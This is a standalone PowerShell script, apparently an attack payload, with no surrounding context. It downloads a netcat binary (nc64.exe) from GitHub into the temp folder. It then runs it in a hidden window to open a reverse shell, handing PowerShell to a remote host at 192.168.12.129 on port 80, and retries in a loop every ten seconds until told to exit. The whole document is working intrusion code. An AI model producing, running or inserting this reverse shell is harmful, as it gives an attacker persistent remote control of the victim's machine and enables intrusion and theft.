$url='https://github.com/int0x33/nc.exe/raw/master/nc64.exe';$tempDir=[System.IO.Path]::GetTempPath();$output=Join-Path -Path $tempDir -ChildPath 'nc64.exe';if (!(Test-Path $output)){Invoke-WebRequest -Uri $url -OutFile $output};while ($true){try {$proc=Start-Process -FilePath $output -ArgumentList '192.168.12.129','80','-e','powershell' -WindowStyle Hidden -PassThru;$stream=[System.IO.StreamReader]::new($proc.StandardOutput.BaseStream);while (!$stream.EndOfStream){$data=$stream.ReadLine();if ($data -eq "exit") {Stop-Process -Id $proc.Id;Remove-Item -Path $output;break}}}catch{Start-Sleep -Seconds 10}}